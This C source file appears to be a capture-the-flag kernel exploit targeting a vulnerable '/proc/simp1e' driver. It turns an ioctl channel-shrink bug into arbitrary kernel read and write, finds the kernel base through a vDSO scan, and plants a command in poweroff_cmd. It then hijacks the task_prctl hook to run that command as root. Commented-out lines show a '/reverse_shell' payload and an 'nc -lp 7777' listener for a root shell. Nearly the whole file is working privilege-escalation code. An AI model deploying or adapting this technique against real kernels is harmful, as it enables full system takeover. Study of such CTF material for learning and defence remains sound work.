/*************************************************************
 * File Name: exp.c
 * 
 * Created on: 2019-10-15 04:30:15
 * Author: raycp
 * 
 * Last Modified: 2019-10-24 08:02:43
 * Description: hijack prctl function pointer to get a root shell.
************************************************************/
#include<stdio.h>
#include<stdlib.h>
#include<inttypes.h>
#include<sys/types.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/auxv.h>
#include <string.h>
#include <stdbool.h>

#define DEV_NAME  "/proc/simp1e"

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8

void die(const char* msg)
{
    perror(msg);
    exit(-1);
            
}


struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct grow_channel_args {
    int id;
    size_t size;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

void arbitrary_read(int fd, int channel_id, void *read_buff, uint64_t addr, uint32_t len)
{

    struct seek_channel_args seek_channel;
    struct read_channel_args read_channel;

    seek_channel.id = channel_id;
    seek_channel.index = addr-0x10;
    seek_channel.whence = SEEK_SET;
    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

    read_channel.id = channel_id;
    read_channel.buf = (char*)read_buff;
    read_channel.count = len;
    ioctl(fd, CSAW_READ_CHANNEL, &read_channel);

    return ;
}

void arbitrary_write(int fd, int channel_id, void* write_buff, uint64_t addr, uint32_t len)
{

    struct seek_channel_args seek_channel;
    struct write_channel_args write_channel;
    uint32_t i;
	
    for (i=0; i<len; i++){

        seek_channel.id = channel_id;
        seek_channel.index = addr-0x10+i;
        seek_channel.whence = SEEK_SET;
        ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

        write_channel.id = channel_id;
        write_channel.buf = (char*)write_buff+i;
        write_channel.count = 1;
        ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);
    }

    return;
}

uint64_t get_vdso_name_offset()
{
    uint64_t sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);
    char* name = "gettimeofday";
    uint64_t name_ptr = 0;
    if (sysinfo_ehdr!=0){
        name_ptr = memmem(sysinfo_ehdr, 0x1000, name, strlen(name));
        if(name_ptr != 0) {
            return name_ptr - sysinfo_ehdr;
        }
    }
    return name_ptr;
}

int main()
{
    int fd, channel_id;
    struct alloc_channel_args alloc_channel;
    struct shrink_channel_args shrink_channel;
    uint64_t addr;
    uint32_t result;
    uint8_t read_buff[0x1000];
    uint32_t i;

    uint64_t vdso_name_offset = 0;
    uint64_t vdso_addr = 0;
    char func_name[] = "gettimeofday";

    setbuf(stdout ,0);

    //step 1 achieve the ability of arbitrary read and write 
    printf("[+] open /dev/csaw\n");
    fd = open(DEV_NAME, O_RDWR);
    
    if(fd == -1)
        die("open dev error");

    alloc_channel.buf_size = 0x100;
    alloc_channel.id = -1;
    ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
    
    if(alloc_channel.id == -1 )
        die("alloc channel error");
    
    channel_id = alloc_channel.id;

    shrink_channel.id = channel_id;
    shrink_channel.size = 0x100 + 1;
    ioctl(fd, CSAW_SHRINK_CHANNEL, &shrink_channel);
    printf("[+] right now, have the ability of arbitrary read write\n");

    //step 2 get the base address of vdso
    vdso_name_offset = get_vdso_name_offset();
    if(vdso_name_offset == 0) {
        die("can't find string gettimeofday in vdso");
    }
    printf("[+] string gettimeofday in vdso offset: %lp\n", vdso_name_offset);

    printf("[+] trying to find vdso in kernel\n");

    for(addr=0xffffffff80000000; addr<0xffffffffffffefff; addr+=0x1000) {
        arbitrary_read(fd, channel_id, read_buff, addr, 0x1000);
        result = strcmp(read_buff+vdso_name_offset, func_name);

        if(result == 0) {
            //printf("find:%lp  %lp\n",read_buff, find_ptr);
            //printf("%s\n",find_ptr);
            vdso_addr = addr;
            printf("[+] vdso addr found at: %lp\n", vdso_addr);
            break;
        }


    }

    if(vdso_addr==0) {
        die("[-] can't find vdso addr");
    }
     
    // step 3 get the base of kernel
    uint64_t kernel_base = vdso_addr - 0x1020000;
    printf("[+] kernel base addr: %lp\n", kernel_base);

    // step 4 deploy the reverse_shell comamnd to poweroff_cmd_addr
    uint64_t poweroff_work_func_offset = 0x9c4c0;
    uint64_t poweroff_cmd_offset = 0x123d1e0;

    uint64_t poweroff_work_func_addr = kernel_base + poweroff_work_func_offset;
    uint64_t poweroff_cmd_addr = kernel_base + poweroff_cmd_offset;

    char arbitrary_command[] = "/bin/chmod 777 /flag";
    //char arbitrary_command[] = "/reverse_shell";
    arbitrary_write(fd, channel_id, arbitrary_command, poweroff_cmd_addr, strlen(arbitrary_command));

    // step 5 overwrite hook.tast_prctl function pointer.
    uint64_t task_prctl_offset = 0x124fd00;
    uint64_t task_prctl_pointer_addr = kernel_base + task_prctl_offset;

    arbitrary_write(fd, channel_id, &poweroff_work_func_addr, task_prctl_pointer_addr, 8);
    
    // step 6 trigger hook
    if( fork() == 0 ){
        prctl(0 ,2, 0, 0,2);
        exit(-1);                 
    }
    
    // step 7 flag is readable now, just cat flag
    printf("[+] flag is readable right now...\n");
    printf("flag: ");
    system("cat flag");
    
    // step 7 waiting for the root shell.
    //printf("[+] waiting for root shell...\n");
    //system("nc -lp 7777");
    
    return 0;
}

